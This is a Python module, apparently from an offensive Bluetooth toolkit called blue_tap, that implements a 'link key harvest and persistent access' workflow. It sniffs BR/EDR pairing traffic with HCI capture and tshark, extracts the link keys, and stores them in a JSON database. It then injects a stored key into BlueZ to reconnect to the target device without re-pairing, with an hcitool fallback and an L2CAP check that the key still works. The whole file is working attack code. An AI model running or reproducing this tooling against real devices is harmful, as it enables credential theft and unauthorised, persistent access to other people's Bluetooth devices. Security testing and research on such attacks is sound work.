"""Link Key Harvest + Persistent Access workflow.

Captures BR/EDR link keys during pairing events and stores them for
later reconnection without re-pairing. Uses HCI capture (btmon) to
monitor pairing exchanges and LinkKeyExtractor to recover keys from
the captured traffic.

Workflow:
  1. Start HCI capture on the target adapter
  2. Wait for a pairing event with the target device
  3. Extract the link key from the capture file
  4. Store the key in a persistent JSON database
  5. Later: inject the stored key into BlueZ and reconnect
"""

import json
import os
import socket
import time
from datetime import datetime, timezone

from blue_tap.recon.hci_capture import HCICapture
from blue_tap.recon.sniffer import LinkKeyExtractor
from blue_tap.utils.bt_helpers import (
    get_adapter_address,
    normalize_mac,
    run_cmd,
)
from blue_tap.utils.output import error, info, success, warning


# ── Key Database ─────────────────────────────────────────────────────────


class KeyDatabase:
    """Persistent JSON store for captured BR/EDR link keys.

    Schema per entry::

        {
            "mac": "AA:BB:CC:DD:EE:FF",
            "link_key": "0123456789ABCDEF0123456789ABCDEF",
            "key_type": 4,
            "captured_at": "2026-03-31T12:00:00+00:00",
            "source": "harvest",
            "verified": false
        }
    """

    def __init__(self, db_path: str) -> None:
        self._path = db_path
        self._entries: dict[str, dict] = {}
        self._load()

    # ── persistence ──────────────────────────────────────────────────

    def _load(self) -> None:
        """Load entries from disk (no-op if file missing)."""
        if os.path.exists(self._path):
            try:
                with open(self._path, "r") as fh:
                    data = json.load(fh)
                if isinstance(data, list):
                    for entry in data:
                        mac = entry.get("mac", "").upper()
                        if mac:
                            self._entries[mac] = entry
            except (json.JSONDecodeError, OSError) as exc:
                warning(f"Could not load key database: {exc}")

    def _save(self) -> None:
        """Atomically persist entries to disk."""
        os.makedirs(os.path.dirname(self._path), exist_ok=True)
        tmp_path = self._path + ".tmp"
        with open(tmp_path, "w") as fh:
            json.dump(list(self._entries.values()), fh, indent=2)
        os.replace(tmp_path, self._path)

    def to_json(self) -> str:
        """Serialize all entries to a JSON string."""
        return json.dumps(list(self._entries.values()), indent=2)

    def from_json(self, data: str) -> None:
        """Replace database contents from a JSON string."""
        entries = json.loads(data)
        self._entries.clear()
        for entry in entries:
            mac = entry.get("mac", "").upper()
            if mac:
                self._entries[mac] = entry
        self._save()

    # ── CRUD ─────────────────────────────────────────────────────────

    def add(
        self,
        mac: str,
        link_key: str,
        key_type: int,
        source: str = "harvest",
    ) -> dict:
        """Store (or update) a link key for *mac*.

        Returns the stored entry dict.
        """
        mac = normalize_mac(mac)
        entry = {
            "mac": mac,
            "link_key": link_key.upper(),
            "key_type": key_type,
            "captured_at": datetime.now(timezone.utc).isoformat(),
            "source": source,
            "verified": False,
        }
        self._entries[mac] = entry
        self._save()
        return entry

    def get(self, mac: str) -> dict | None:
        """Retrieve the stored key entry for *mac*, or ``None``."""
        mac = normalize_mac(mac)
        return self._entries.get(mac)

    def list_all(self) -> list[dict]:
        """Return every stored key entry."""
        return list(self._entries.values())

    def remove(self, mac: str) -> bool:
        """Delete the key for *mac*.  Returns True if it existed."""
        mac = normalize_mac(mac)
        if mac in self._entries:
            del self._entries[mac]
            self._save()
            return True
        return False


# ── Key Harvester ────────────────────────────────────────────────────────


class KeyHarvester:
    """Capture link keys from live pairing events and manage reconnection.

    Typical usage::

        harvester = KeyHarvester()
        key = harvester.harvest("AA:BB:CC:DD:EE:FF", duration=120)
        if key:
            harvester.reconnect("AA:BB:CC:DD:EE:FF")
    """

    _POLL_INTERVAL = 2  # seconds between capture-file checks

    def __init__(self, hci: str = "hci0", session_dir: str | None = None) -> None:
        self._hci = hci
        if session_dir is None:
            session_dir = os.path.join(os.getcwd(), "session")
        self._session_dir = session_dir
        self._keys_dir = os.path.join(session_dir, "keys")
        os.makedirs(self._keys_dir, exist_ok=True)

        self._db = KeyDatabase(os.path.join(self._keys_dir, "key_db.json"))
        self._extractor = LinkKeyExtractor()
        self._capture = HCICapture()

    @property
    def db(self) -> KeyDatabase:
        """Access the underlying key database."""
        return self._db

    # ── harvest ──────────────────────────────────────────────────────

    def harvest(
        self,
        target_mac: str,
        duration: int = 300,
    ) -> dict | None:
        """Capture a pairing exchange and extract the link key.

        Starts an HCI capture in btsnoop/pcap format, polls for pairing
        activity, then extracts the key when the capture finishes.

        Args:
            target_mac: BD_ADDR of the device expected to pair.
            duration: Maximum seconds to wait for a pairing event.

        Returns:
            The key-database entry dict, or ``None`` if no key captured.
        """
        target_mac = normalize_mac(target_mac)
        pcap_path = os.path.join(
            self._keys_dir,
            f"harvest_{target_mac.replace(':', '')}_{int(time.time())}.pcap",
        )

        info(f"Starting link-key harvest for {target_mac} ({duration}s window)")
        if not self._capture.start(pcap_path, hci=self._hci, pcap=True):
            error("Failed to start HCI capture — aborting harvest")
            return None

        pairing_detected = False
        deadline = time.time() + duration

        try:
            while time.time() < deadline:
                time.sleep(self._POLL_INTERVAL)

                # Check if the capture file is growing (pairing traffic)
                if os.path.exists(pcap_path):
                    size = os.path.getsize(pcap_path)
                    if size > 512:
                        # Non-trivial traffic captured — check for pairing
                        pairing_detected = self._check_pairing_in_progress(
                            pcap_path, target_mac
                        )
                        if pairing_detected:
                            info("Pairing activity detected — finalising capture")
                            # Give a few more seconds for the exchange to complete
                            time.sleep(5)
                            break
        finally:
            self._capture.stop()

        # Attempt key extraction from the capture
        result = self._extractor.extract_from_pcap(pcap_path)
        if not result.get("success") or not result.get("keys"):
            if pairing_detected:
                warning("Pairing detected but no link key recovered (SSP/ECDH?)")
            else:
                info("No pairing event captured within the time window")
            return None

        # Store the first recovered key
        link_key = result["keys"][0]
        entry = self._db.add(
            mac=target_mac,
            link_key=link_key,
            key_type=4,  # authenticated combination key
            source="harvest",
        )
        success(f"Link key captured and stored for {target_mac}")
        return entry

    # ── reconnect ────────────────────────────────────────────────────

    def reconnect(self, target_mac: str) -> bool:
        """Inject a stored key into BlueZ and attempt to connect.

        Args:
            target_mac: BD_ADDR of the previously-paired device.

        Returns:
            True if the connection attempt succeeded.
        """
        target_mac = normalize_mac(target_mac)
        entry = self._db.get(target_mac)
        if entry is None:
            error(f"No stored key for {target_mac}")
            return False

        adapter_mac = get_adapter_address(self._hci)
        if adapter_mac is None:
            error(f"Cannot determine MAC for adapter {self._hci}")
            return False

        info(f"Injecting stored link key for {target_mac}")
        ok = self._extractor.inject_link_key(
            adapter_mac=adapter_mac,
            remote_mac=target_mac,
            link_key=entry["link_key"],
            key_type=entry["key_type"],
        )
        if not ok:
            error("Link key injection failed")
            return False

        # Attempt connection via bluetoothctl
        info(f"Connecting to {target_mac} via bluetoothctl...")
        result = run_cmd(
            ["bluetoothctl", "connect", target_mac],
            timeout=15,
        )
        if result.returncode == 0 and "Connection successful" in result.stdout:
            success(f"Connected to {target_mac} using stored key")
            self._db.add(
                mac=target_mac,
                link_key=entry["link_key"],
                key_type=entry["key_type"],
                source=entry.get("source", "harvest"),
            )
            # Mark as verified since connection succeeded
            db_entry = self._db.get(target_mac)
            if db_entry is not None:
                db_entry["verified"] = True
                self._db._save()
            return True

        warning(f"bluetoothctl connect returned: {result.stdout.strip()}")
        warning("Trying raw HCI connection as fallback...")

        # Fallback: raw HCI connect via hcitool
        result = run_cmd(
            ["sudo", "hcitool", "-i", self._hci, "cc", target_mac],
            timeout=15,
        )
        if result.returncode == 0:
            success(f"Raw HCI connection to {target_mac} established")
            db_entry = self._db.get(target_mac)
            if db_entry is not None:
                db_entry["verified"] = True
                self._db._save()
            return True

        error(f"Connection to {target_mac} failed via both methods")
        return False

    # ── verify ───────────────────────────────────────────────────────

    def verify_key(self, target_mac: str) -> bool:
        """Verify a stored key by attempting an L2CAP connection.

        Connects to L2CAP PSM 1 (SDP) which every BR/EDR device must
        support. A successful socket connect proves the link key is still
        accepted by the remote device.

        Args:
            target_mac: BD_ADDR of the device to verify.

        Returns:
            True if the stored key is still valid.
        """
        target_mac = normalize_mac(target_mac)
        entry = self._db.get(target_mac)
        if entry is None:
            error(f"No stored key for {target_mac}")
            return False

        # Ensure the key is injected into BlueZ first
        adapter_mac = get_adapter_address(self._hci)
        if adapter_mac is None:
            error(f"Cannot determine MAC for adapter {self._hci}")
            return False

        self._extractor.inject_link_key(
            adapter_mac=adapter_mac,
            remote_mac=target_mac,
            link_key=entry["link_key"],
            key_type=entry["key_type"],
        )

        info(f"Verifying link key for {target_mac} via L2CAP SDP...")
        try:
            sock = socket.socket(
                socket.AF_BLUETOOTH,
                socket.SOCK_SEQPACKET,
                socket.BTPROTO_L2CAP,
            )
            sock.settimeout(10)
            sock.connect((target_mac, 1))  # PSM 1 = SDP
            sock.close()
            success(f"Key verified — {target_mac} accepted connection")
            entry["verified"] = True
            self._db._save()
            return True
        except (OSError, socket.error) as exc:
            warning(f"Key verification failed for {target_mac}: {exc}")
            entry["verified"] = False
            self._db._save()
            return False

    # ── internal helpers ─────────────────────────────────────────────

    @staticmethod
    def _check_pairing_in_progress(pcap_path: str, target_mac: str) -> bool:
        """Quick check whether the pcap contains LMP pairing frames.

        Uses tshark to look for LMP opcodes related to pairing
        (au_rand, sres, link_key_notification). This is a heuristic —
        a full extraction is done after the capture stops.
        """
        result = run_cmd(
            [
                "tshark", "-r", pcap_path,
                "-Y", "btlmp.op == 11 || btlmp.op == 12 || btlmp.op == 17",
                "-c", "1",  # stop after first match
            ],
            timeout=10,
        )
        return result.returncode == 0 and result.stdout.strip() != ""
